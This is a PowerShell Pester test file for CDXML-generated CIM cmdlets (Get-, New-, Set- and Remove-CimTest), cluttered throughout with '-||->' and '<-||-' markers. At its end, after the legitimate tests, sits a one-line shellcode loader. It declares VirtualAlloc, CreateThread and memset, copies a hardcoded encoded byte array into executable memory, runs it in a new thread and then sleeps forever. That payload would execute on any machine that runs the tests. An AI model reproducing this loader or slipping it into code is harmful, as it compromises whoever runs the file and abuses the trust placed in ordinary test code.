

 -||-> $script:CimClassName = "PSCore_CimTest1" <-||- 
 -||-> $script:CimNamespace = "root/default" <-||- 
 -||-> $script:moduleDir =  -||-> Join-Path -Path $PSScriptRoot -ChildPath assets -AdditionalChildPath CimTest <-||-  <-||- 
 -||-> $script:deleteMof =  -||-> Join-Path -Path $moduleDir -ChildPath DeleteCimTest.mof <-||-  <-||- 
 -||-> $script:createMof =  -||-> Join-Path -Path $moduleDir -ChildPath CreateCimTest.mof <-||-  <-||- 

 -||-> $CimCmdletArgs = @{
    Namespace =  -||-> ${script:CimNamespace} <-||- 
    ClassName =  -||-> ${script:CimClassName} <-||- 
    ErrorAction =  -||-> "SilentlyContinue" <-||- 
    } <-||- 

 -||-> $script:ItSkipOrPending = @{} <-||- 

 -||-> function Test-CimTestClass {
     -||-> $null -eq ( -||-> Get-CimClass @CimCmdletArgs <-||- ) <-||- 
} <-||- 

 -||-> function Test-CimTestInstance {
     -||-> $null -eq ( -||-> Get-CimInstance @CimCmdletArgs <-||- ) <-||- 
} <-||- 

 -||-> Describe "Cdxml cmdlets are supported" -Tag CI,RequireAdminOnWindows {
     -||-> BeforeAll {
         -||-> $skipNotWindows = ! $IsWindows <-||- 
         -||-> if (  -||-> $skipNotWindows <-||-  ) {
             -||-> $script:ItSkipOrPending = @{ Skip =  -||-> $true <-||-  } <-||- 
            return
        } <-||- 

        
        
        
        
         -||-> if (  -||-> ( -||-> Get-Command -ErrorAction SilentlyContinue Mofcomp.exe <-||- ) -eq $null <-||-  ) {
             -||-> $script:ItSkipOrPending = @{ Skip =  -||-> $true <-||-  } <-||- 
            return
        } <-||- 

        
        
         -||-> if (  -||-> Test-CimTestClass <-||-  ) {
             -||-> if (  -||-> Test-CimTestInstance <-||-  ) {
                 -||-> Get-CimInstance @CimCmdletArgs | Remove-CimInstance <-||- 
            } <-||- 
            
            
             -||-> $result =  -||-> MofComp.exe $deleteMof <-||-  <-||- 
             -||-> $script:MofCompReturnCode = $LASTEXITCODE <-||- 
             -||-> if (  -||-> $script:MofCompReturnCode -ne 0 <-||-  ) {
                return
            } <-||- 
        } <-||- 

        
        
        
         -||-> $testMof =  -||-> Get-Content -Path ${script:createmof} -Raw <-||-  <-||- 
         -||-> $currentTimeZone = [System.TimeZoneInfo]::Local <-||- 

        
        
        
         -||-> $offsetMinutes = ( -||-> $currentTimeZone.GetUtcOffset([datetime]::new(2008, 01, 01, 0, 0, 0)) <-||- ).TotalMinutes <-||- 
         -||-> $UTCOffset = "{0:+000;-000}" -f $offsetMinutes <-||- 
         -||-> $testMof = $testMof.Replace("<UTCOffSet>", $UTCOffset) <-||- 
         -||-> Set-Content -Path $testDrive\testmof.mof -Value $testMof <-||- 
         -||-> $result =  -||-> MofComp.exe $testDrive\testmof.mof <-||-  <-||- 
         -||-> $script:MofCompReturnCode = $LASTEXITCODE <-||- 
         -||-> if (  -||-> $script:MofCompReturnCode -ne 0 <-||-  ) {
            return
        } <-||- 

        
         -||-> if (  -||-> Get-Module CimTest <-||-  ) {
             -||-> Remove-Module -force CimTest <-||- 
        } <-||- 
         -||-> Import-Module -force ${script:ModuleDir} <-||- 
    } <-||- 

     -||-> AfterAll {
         -||-> if (  -||-> $skipNotWindows <-||-  ) {
            return
        } <-||- 
         -||-> if (  -||-> get-module CimTest <-||-  ) {
             -||-> Remove-Module CimTest -Force <-||- 
        } <-||- 
         -||-> $null =  -||-> MofComp.exe $deleteMof <-||-  <-||- 
         -||-> if (  -||-> $LASTEXITCODE -ne 0 <-||-  ) {
             -||-> Write-Warning "Could not remove PSCore_CimTest class" <-||- 
        } <-||- 
    } <-||- 

     -||-> BeforeEach {
         -||-> If (  -||-> $script:MofCompReturnCode -ne 0 <-||-  ) {
            throw  -||-> "MofComp.exe failed with exit code $MofCompReturnCode" <-||- 
        } <-||- 
    } <-||- 

     -||-> Context "Module level tests" {
         -||-> It "The CimTest module should have been loaded" @ItSkipOrPending {
             -||-> $result =  -||-> Get-Module CimTest <-||-  <-||- 
             -||-> $result.ModuleBase | should -Be ${script:ModuleDir} <-||- 
        } <-||- 

         -||-> It "The CimTest module should have the proper cmdlets" @ItSkipOrPending {
             -||-> $result =  -||-> Get-Command -Module CimTest <-||-  <-||- 
             -||-> $result.Count | Should -Be 4 <-||- 
             -||-> ( -||-> $result.Name | sort-object <-||-  ) -join "," | Should -Be "Get-CimTest,New-CimTest,Remove-CimTest,Set-CimTest" <-||- 
        } <-||- 
    } <-||- 

     -||-> Context "Get-CimTest cmdlet" {
         -||-> It "The Get-CimTest cmdlet should return 4 objects" @ItSkipOrPending {
             -||-> $result =  -||-> Get-CimTest <-||-  <-||- 
             -||-> $result.Count | should -Be 4 <-||- 
             -||-> ( -||-> $result.id |sort-object <-||- ) -join ","  | should -Be "1,2,3,4" <-||- 
        } <-||- 

         -||-> It "The Get-CimTest cmdlet should retrieve an object via id" @ItSkipOrPending {
             -||-> $result =  -||-> Get-CimTest -id 1 <-||-  <-||- 
             -||-> @( -||-> $result <-||- ).Count | should -Be 1 <-||- 
             -||-> $result.field1 | Should -Be "instance 1" <-||- 
        } <-||- 

         -||-> It "The Get-CimTest cmdlet should retrieve an object by piped id" @ItSkipOrPending {
             -||-> $result =  -||-> 1,2,4 | foreach-object {  -||-> [pscustomobject]@{ id =  -||-> $_ <-||-  } <-||-  } | Get-CimTest <-||-  <-||- 
             -||-> @( -||-> $result <-||- ).Count | should -Be 3 <-||- 
             -||-> (  -||-> $result.id | sort-object <-||-  ) -join "," | Should -Be "1,2,4" <-||- 
        } <-||- 

         -||-> It "The Get-CimTest cmdlet should retrieve an object by datetime" @ItSkipOrPending {
             -||-> $result =  -||-> Get-CimTest -DateTime ( -||-> [datetime]::new(2008,01,01,0,0,0) <-||- ) <-||-  <-||- 
             -||-> @( -||-> $result <-||- ).Count | Should -Be 1 <-||- 
             -||-> $result.field1 | Should -Be "instance 1" <-||- 
        } <-||- 

         -||-> It "The Get-CimTest cmdlet should return the proper error if the instance does not exist" @ItSkipOrPending {
             -||-> {  -||-> Get-CimTest -ErrorAction Stop -id "ThisIdDoesNotExist" <-||-  } | Should -Throw -ErrorId "CmdletizationQuery_NotFound_Id,Get-CimTest" <-||- 
        } <-||- 

         -||-> It "The Get-CimTest cmdlet should work as a job" @ItSkipOrPending {
             -||-> try {
                 -||-> $job =  -||-> Get-CimTest -AsJob <-||-  <-||- 
                 -||-> $result = $null <-||- 
                
                
                
                 -||-> $null =  -||-> Wait-Job -Job $job -timeout 10 <-||-  <-||- 
                 -||-> $result =  -||-> $job | Receive-Job <-||-  <-||- 
                 -||-> $result.Count | should -Be 4 <-||- 
                 -||-> (  -||-> $result.id | sort-object <-||-  ) -join "," | Should -Be "1,2,3,4" <-||- 
            }
            finally {
                 -||-> if (  -||-> $job <-||-  ) {
                     -||-> $job | Remove-Job -force <-||- 
                } <-||- 
            } <-||- 
        } <-||- 

         -||-> It "Should be possible to invoke a method on an object returned by Get-CimTest" @ItSkipOrPending {
             -||-> $result =  -||-> Get-CimTest | Select-Object -first 1 <-||-  <-||- 
             -||-> $result.GetCimSessionInstanceId() | Should -BeOfType [guid] <-||- 
        } <-||- 
    } <-||- 

     -||-> Context "Remove-CimTest cmdlet" {
         -||-> BeforeEach {
             -||-> Get-CimTest | Remove-CimTest <-||- 
             -||-> 1..4 | Foreach-Object {  -||-> New-CimInstance -namespace root/default -class PSCore_Test1 -property @{
                id =  -||-> "$_" <-||- 
                field1 =  -||-> "field $_" <-||- 
                field2 =  -||-> 10 * $_ <-||- 
                } <-||- 
            } <-||- 
        } <-||- 

         -||-> It "The Remote-CimTest cmdlet should remove objects by id" @ItSkipOrPending {
             -||-> Remove-CimTest -id 1 <-||- 
             -||-> $result =  -||-> Get-CimTest <-||-  <-||- 
             -||-> $result.Count | should -Be 3 <-||- 
             -||-> ( -||-> $result.id |sort-object <-||- ) -join ","  | should -Be "2,3,4" <-||- 
        } <-||- 

         -||-> It "The Remove-CimTest cmdlet should remove piped objects" @ItSkipOrPending {
             -||-> Get-CimTest -id 2 | Remove-CimTest <-||- 
             -||-> $result  =  -||-> Get-CimTest <-||-  <-||- 
             -||-> @( -||-> $result <-||- ).Count | should -Be 3 <-||- 
             -||-> ( -||-> $result.id |sort-object <-||- ) -join ","  | should -Be "1,3,4" <-||- 
        } <-||- 

         -||-> It "The Remove-CimTest cmdlet should work as a job" @ItSkipOrPending {
             -||-> try {
                 -||-> $job =  -||-> Get-CimTest -id 3 | Remove-CimTest -asjob <-||-  <-||- 
                 -||-> $result = $null <-||- 
                
                
                
                 -||-> $null =  -||-> Wait-Job -Job $job -Timeout 10 <-||-  <-||- 
                 -||-> $result  =  -||-> Get-CimTest <-||-  <-||- 
                 -||-> @( -||-> $result <-||- ).Count | should -Be 3 <-||- 
                 -||-> ( -||-> $result.id |sort-object <-||- ) -join ","  | should -Be "1,2,4" <-||- 
            }
            finally {
                 -||-> if (  -||-> $job <-||-  ) {
                     -||-> $job | Remove-Job -force <-||- 
                } <-||- 
            } <-||- 
        } <-||- 
    } <-||- 

     -||-> Context "New-CimTest operations" {
         -||-> It "Should create a new instance" @ItSkipOrPending {
             -||-> $instanceArgs = @{
                id =  -||-> "telephone" <-||- 
                field1 =  -||-> "television" <-||- 
                field2 =  -||-> 0 <-||- 
            } <-||- 
             -||-> New-CimTest @instanceArgs <-||- 
             -||-> $result =  -||-> Get-CimInstance -namespace root/default -class PSCore_Test1 | Where-Object { -||-> $_.id -eq "telephone" <-||- } <-||-  <-||- 
             -||-> $result.field2 | should -Be 0 <-||- 
             -||-> $result.field1 | Should -Be $instanceArgs.field1 <-||- 
        } <-||- 

         -||-> It "Should return the proper error if called with an improper value" @ItSkipOrPending {
             -||-> $instanceArgs = @{
                Id =  -||-> "error validation" <-||- 
                field1 =  -||-> "a string" <-||- 
                field2 =  -||-> "a bad string" <-||-  
            } <-||- 
             -||-> {  -||-> New-CimTest @instanceArgs <-||-  } | Should -Throw -ErrorId "ParameterArgumentTransformationError,New-CimTest" <-||- 
            
             -||-> Get-CimTest -id $instanceArgs.Id -ErrorAction SilentlyContinue | Should -BeNullOrEmpty <-||- 
        } <-||- 

         -||-> It "Should support -whatif" @ItSkipOrPending {
             -||-> $instanceArgs = @{
                Id =  -||-> "1000" <-||- 
                field1 =  -||-> "a string" <-||- 
                field2 =  -||-> 111 <-||- 
                Whatif =  -||-> $true <-||- 
            } <-||- 
             -||-> New-CimTest @instanceArgs <-||- 
             -||-> Get-CimTest -id $instanceArgs.Id -ErrorAction SilentlyContinue | Should -BeNullOrEmpty <-||- 
        } <-||- 
    } <-||- 

     -||-> Context "Set-CimTest operations" {
         -||-> It "Should set properties on an instance" @ItSkipOrPending {
             -||-> $instanceArgs = @{
                id =  -||-> "updateTest1" <-||- 
                field1 =  -||-> "updatevalue" <-||- 
                field2 =  -||-> 100 <-||- 
            } <-||- 
             -||-> $newValues = @{
                id =  -||-> "updateTest1" <-||- 
                field2 =  -||-> 22 <-||- 
                field1 =  -||-> "newvalue" <-||- 
            } <-||- 
             -||-> New-CimTest @instanceArgs <-||- 
             -||-> $result =  -||-> Get-CimTest -id $instanceArgs.id <-||-  <-||- 
             -||-> $result.field2 | should -Be $instanceArgs.field2 <-||- 
             -||-> $result.field1 | Should -Be $instanceArgs.field1 <-||- 
             -||-> Set-CimTest @newValues <-||- 
             -||-> $result =  -||-> Get-CimTest -id $newValues.id <-||-  <-||- 
             -||-> $result.field1 | Should -Be $newValues.field1 <-||- 
             -||-> $result.field2 | should -Be $newValues.field2 <-||- 
        } <-||- 

         -||-> It "Should set properties on an instance via pipeline" @ItSkipOrPending {
             -||-> $instanceArgs = @{
                id =  -||-> "updateTest2" <-||- 
                field1 =  -||-> "updatevalue" <-||- 
                field2 =  -||-> 100 <-||- 
            } <-||- 
             -||-> New-CimTest @instanceArgs <-||- 
             -||-> $result =  -||-> Get-CimTest -id $instanceArgs.id <-||-  <-||- 
             -||-> $result.field2 | should -Be $instanceArgs.field2 <-||- 
             -||-> $result.field1 | Should -Be $instanceArgs.field1 <-||- 
             -||-> $result.field1 = "yet another value" <-||- 
             -||-> $result.field2 = 33 <-||- 
             -||-> $result | Set-CimTest <-||- 
             -||-> $result =  -||-> Get-CimTest -id $instanceArgs.id <-||-  <-||- 
             -||-> $result.field1 | Should -Be "yet another value" <-||- 
             -||-> $result.field2 | should -Be 33 <-||- 
        } <-||- 
    } <-||- 

} <-||- 

 -||-> $c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xda,0xc0,0xbf,0xf5,0x6e,0xa5,0x30,0xd9,0x74,0x24,0xf4,0x5a,0x29,0xc9,0xb1,0x47,0x31,0x7a,0x18,0x83,0xea,0xfc,0x03,0x7a,0xe1,0x8c,0x50,0xcc,0xe1,0xd3,0x9b,0x2d,0xf1,0xb3,0x12,0xc8,0xc0,0xf3,0x41,0x98,0x72,0xc4,0x02,0xcc,0x7e,0xaf,0x47,0xe5,0xf5,0xdd,0x4f,0x0a,0xbe,0x68,0xb6,0x25,0x3f,0xc0,0x8a,0x24,0xc3,0x1b,0xdf,0x86,0xfa,0xd3,0x12,0xc6,0x3b,0x09,0xde,0x9a,0x94,0x45,0x4d,0x0b,0x91,0x10,0x4e,0xa0,0xe9,0xb5,0xd6,0x55,0xb9,0xb4,0xf7,0xcb,0xb2,0xee,0xd7,0xea,0x17,0x9b,0x51,0xf5,0x74,0xa6,0x28,0x8e,0x4e,0x5c,0xab,0x46,0x9f,0x9d,0x00,0xa7,0x10,0x6c,0x58,0xef,0x96,0x8f,0x2f,0x19,0xe5,0x32,0x28,0xde,0x94,0xe8,0xbd,0xc5,0x3e,0x7a,0x65,0x22,0xbf,0xaf,0xf0,0xa1,0xb3,0x04,0x76,0xed,0xd7,0x9b,0x5b,0x85,0xe3,0x10,0x5a,0x4a,0x62,0x62,0x79,0x4e,0x2f,0x30,0xe0,0xd7,0x95,0x97,0x1d,0x07,0x76,0x47,0xb8,0x43,0x9a,0x9c,0xb1,0x09,0xf2,0x51,0xf8,0xb1,0x02,0xfe,0x8b,0xc2,0x30,0xa1,0x27,0x4d,0x78,0x2a,0xee,0x8a,0x7f,0x01,0x56,0x04,0x7e,0xaa,0xa7,0x0c,0x44,0xfe,0xf7,0x26,0x6d,0x7f,0x9c,0xb6,0x92,0xaa,0x09,0xb2,0x04,0x07,0x9f,0x82,0xad,0xcf,0x1d,0xfb,0x5c,0x4c,0xab,0x1d,0x0e,0x3c,0xfb,0xb1,0xee,0xec,0xbb,0x61,0x86,0xe6,0x33,0x5d,0xb6,0x08,0x9e,0xf6,0x5c,0xe7,0x77,0xae,0xc8,0x9e,0xdd,0x24,0x69,0x5e,0xc8,0x40,0xa9,0xd4,0xff,0xb5,0x67,0x1d,0x75,0xa6,0x1f,0xed,0xc0,0x94,0x89,0xf2,0xfe,0xb3,0x35,0x67,0x05,0x12,0x62,0x1f,0x07,0x43,0x44,0x80,0xf8,0xa6,0xdf,0x09,0x6d,0x09,0xb7,0x75,0x61,0x89,0x47,0x20,0xeb,0x89,0x2f,0x94,0x4f,0xda,0x4a,0xdb,0x45,0x4e,0xc7,0x4e,0x66,0x27,0xb4,0xd9,0x0e,0xc5,0xe3,0x2e,0x91,0x36,0xc6,0xae,0xed,0xe0,0x2e,0xc5,0x1f,0x31 <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $x=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $x.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$x,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



